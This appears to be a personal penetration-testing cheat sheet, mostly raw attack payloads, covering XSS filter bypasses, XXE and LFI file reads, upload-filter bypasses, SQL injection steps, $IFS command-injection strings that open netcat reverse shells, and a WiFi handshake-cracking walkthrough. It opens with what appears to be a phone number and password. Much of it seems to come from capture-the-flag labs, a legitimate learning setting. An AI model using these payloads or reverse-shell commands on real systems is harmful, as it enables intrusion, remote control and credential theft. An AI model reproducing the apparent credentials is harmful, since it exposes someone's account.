lab.dota    18665136406   123456

# VPN: get a proxy before you test a web

VPN: L2TP PPTP IPSEC

SSR/SSRR: 升级版本

V2RAY: 框架平台

## Proxy application

[登录 — 速鹰666 (sy168.site)](https://sy168.site/auth/login)

[deyun125.xyz](http://deyun125.xyz/user)



# CDN

content distribution network



# OWASP

## XSS

;;;;;;;use these characters to test the filter mechanism

aaa<bbb>ccc/ddd'eee"fff;ggg:hhh

;;;;;;;;;;;;;;;;;;;;sometimes we need space after the quotation mark to close the attribute tag. 



;;;;;;;;;;;;;;;;;;;;;;;encode and decode in many ways: hex, urlencode

%26%23x73%3B

===>   "&", "#", "s", ";"

%26%23x2f%3B

x2f   is a hexdecimal number, means "/"

when we want to bypass some kind of filter machanism, we need wrap the character we want to replace using %26, %23 and %3B in this specific order.  

%0d, %0a  can help bypass the machanism that forbiddens the space. 

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

"><a href=javascript:alert(1)>a</a>

sometimes, you need to grab the http header and manipulate the User-Agent.



;;;;;;;;;;;;;;;;;;;;;;; 

'onclick='window.alert()

"onclick='alert(1)'

;;;;;;;;;;;;;;;;when you want to wrap onclick attribute to the tag

## XML external entity (XXE) injection

Common way to test the XXE

<?xml version="1.0" encoding="UTF-8"?>   

<!DOCTYPE ANY [
<!ENTITY name "test1">]>

<root>&name;</root>

###### use in SSRF

If we change to file:///etc/passwd

<?xml  version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
<foo>&xxe;</foo>


something like this. ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "php://filter/read=convert.base64-encode/resource=key.php" >]>
<user><username>&xxe;</username><password>&xxe;</password></user>


## LFI

##### LFI via /proc/self/environ

Once code has been injected into the User Agent header a local file inclusion vulnerability can be leveraged to execute /proc/self/environ and reload the environment variables, executing your reverse shell.

##### Null Byte Technique

vuln.php?page=/etc/passwd%00

vuln.php?page=/etc/passwd%2500

##### PHP Wrapper

###### php://filter

/include.php?dota=php://filter/read=convert.base64-encode/resource=key.txt

;;;;;;;;;;;;;remember to decode the base64 cipher text

###### php://input

/include.php?dota=php://input

post data:  <?php system('cat key.php');?>

;;;;;;;;;;;;;;;;to post data but not upload file



###### Hex encode

%252e%252e%252fupload%252fshell%252etxt

%2E%2E%2Fupload%2Fshell%2Etxt

"%252e" --> "."

"%252f" --> "/"

"%253C" --> "<"

;;;;;;;;;;;;;;use **hexencode** to bypass the special character filtration, to specify the local file path

sometimes to get rid of the extension like php and html,  you need %00, %23 "#" or just overlow the byte upper limit.  

###### zip://path

--->Use the zip wrapper to extract the payload using: php?page=zip://path/to/file.zip%23shell



##### Truncation LFI Bypass

##### Log File Contamination

Log file contamination is the process of injecting source code into log files on the target system.  For example, injecting PHP reverse shell code into a URL, causing syslog to create an entry in the apache access log for a 404 page not found entry. The apache log file would then be parsed.  

After introducing source code to the target systems log file(s) the next step is identifying the location of the log file.  



FuzzDB’s Burp LFI payload lists can be used in conjunction with Burp intruder to quickly identify valid log file locations on the target system.



## Command injection bypass

$;ls$IFS$9key.ph?

use $IFS to bypass the space filter, and "?", as a regex to bypass the character filter

remember not to miss everything, including the front-end page



## Upload file - web vul

“GIF89a” is the first byte of gif file signature..

can be used to fake the image file signature and bypass the isimage()..

### PHP audit

**exif_imagetype()** reads the first bytes of an image and checks its signature.

### bypass checkfile()  -- front end

delete the checkfile() in the front end page

### bypass Uppercase and lowercase

simply change the extention ".php" to ".PHP"

### htaccess Vul

Using .htaccess to re-configure the apache server, it is not blacklisted, so it is okay to upload it.

Type "AddType    application/x-httpd-php      .jpg"   in htaccess file

`.htaccess`文件里的代码的含义 是 将上传的文件后缀名为`.jpg`格式的文件以 php格式来解析文件。

Or 

Type "SetHandler application/x-httpd-php"       same effect as the above code.

### Get00 intercept

/upload/trojan.php%00

filename=trojan.jpg

### POST00 intercept

/upload/trojan.php%00  --> post request won't interpret %00 automatically. 

filename=trojan.jpg

双写绕过

MIME: content-type: image/gif

换行解析漏洞  \r\n, CRLF

文件头绕过   png ---> 89 50 4E 47, gif --> GIF89a,  jpeg--> 

php解析漏洞  

二次渲染

## SQLi

#### basic

1) order by 3

2) -1

3) union select 1, @@datadir, version()

4) 1, group_concat(schema_name), 3 from information_schema.schemata--+

5) 1, group_concat(table_name), 3 from information_schema.tables where table_schema="security"--+

6) http://127.0.0.1/sqli-labs-master/Less-3/index.php?id=-1') union select 1,group_concat(column_name),version() from information_schema.columns where table_name="users"--+

7) 1, username, password from users where id =2--+  





# kali linux for ssh

Include /etc/ssh/ssh_config.d/*.conf

;;;;;;;;;;;delete the #   at the line of PasswordAuthentication yes

vim /etc/ssh/ssh.config

service ssh restart  

--> to start the service of ssh

netstat -nulpt | grep ssh  

--> check the opening port 



su root  

-->  to gain the previlage of the admin





chgrp -R kali 1.txt

chown -R kali 1.txt

chmod 777 trojan.php



# Info gathering

## TOOLs

whois

;;;;;;;;;;;;;;;;;;;;--> domain name/ manager info/ Ltd. info

wappalyzer

;;;;;;;;;;;;;;;;;;; -->Web structure & programming language used

nslookup -qt=any bing.com

wpscan

;;;;;;;;;;;;;---> check the wordpress version

dig <url>   (+trace ---> to check every steps)

;;;;;;;;;;;;;;;;;;;;; -->for subdomain

FOFA  (it is a web application)

NMAP scan

Whatweb

;;;;;;;;;;;;;;;;;;;;;--->web print

waf00f

;;;;;;;;;;;;;;;;;;;;;;;;----> check if there is WAF detected

robots.txt

site with same IP(segmented scan)

sitemap  (Burp Suite, Nessus)







### find targets

netdiscover -r 10.0.0.1/24 -i eth0

nmap -sC -sV -p- 10.0.0.32

::::::::::::::::::::-sC for numeration -sV for default scripts

nc -nv 10.0.0.32 80

;;;;;;;;;;;;;;;;;;;;to see if http open or not

### find sub-web

gobuster dir -u http://10.0.0.32 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html, txt, php

;;;;;;;;;;;;;;; -u : for url, -w: for wordlist, -x: for extension

;;;;;;;;;;;;;;;;;;;;;;to see if we can get /phpinfo.php, /file.php or others

;;;;;;;;;;;;;;;;;;;;;;they can tell if the site opened file-uploads, LFI(Local File Inclusion)

;;;;;;;;;;;;;;;;;E.g. /file.php?file=/etc/passwd

gobuster dir -u http://jewel.uploadvulns.com.thm -w /usr/share/wordlists/dirb/big.txt -t 250 | tee gobuster-root-big



### find subdomain (gobuster's vhost mode)

gobuster vhost -v -w <wordlist.txt> -u <url> -o <output_file.txt>

;;;;;;Example: 

gobuster vhost -v -w /home/username/SecLists/Discover/DNS/subdomains-top1million-5000.txt -u http://workder.htb -o vhosts.txt

### find subdomain in a specific domain

gobuser dns -d workers.htb -w /home/username/SecLists/Discovery/DNS/subdomains/-top1million-5000.txt -i



### check some ports

showmount -e 10.0.0.32

;;;;;;;;;;;;;;;;;;;;;you may get /mnt/nfs *









# Listen to reverse shell

nc -lvnp 4444

nc -lvnp 443 (node.js shell)

to connect to the server and execute command

### The shell

$;nc$IFS$9192.168.254.128$IFS$94444$IFS$9-e$IFS$9/bin/sh

nc -e /bin/sh 192.168.0.123 1234





$;ls$IFS${9}key.ph?;nc$IFS${9}192.168.254.128$IFS${9}4444$IFS${9}-e$IFS${9}/bin/sh

$;echo\$IFS$9"trojan">shell.php

$;echo$IFS$9"trojan">shell.php

# =====================

# =====================

# wifi-cracking

## 1: 

### Wireless USB WiFi Adapter for PC

Realtek RTL8187



## 2: 

### check if VM has chosen the adapter

check by typing 'ifconfig' ----> see if there is 'wlan0'

## 3: 

### activate the listening mode in wireless wifi adapter

#### airmon-ng start wlan0

## 4:

### check if the activation is successful. 

#### iwconfig

'wlan0mon' means success 

you can see the same outcome by typing ifconfig

## 5:

### scan wifi signal

airodump-ng wlan0mon

you need to know about terms like BSSID, PWR, Beacons, #Data, #/s, CH, MB, ENC, CIPHER, AUTH, ESSID

## 6:

### capture the wifi handshake packet

airodump-ng --bssid BSSID -c {CH} -w {storage path} wlan0mon

airodump-ng --bssid 8E:D2:19:E7:05:2D -c 6 -w /root/wifi/ wlan0mon

to capture it, you need users to connect the wifi

## 7:

### crack the data packet

aircrack-ng -w {wordlist} {above handshake packet path}

aircrack-ng -w /usr/share/wordlists/dirb/big.txt /root/-0.1.cap

then you will have the password

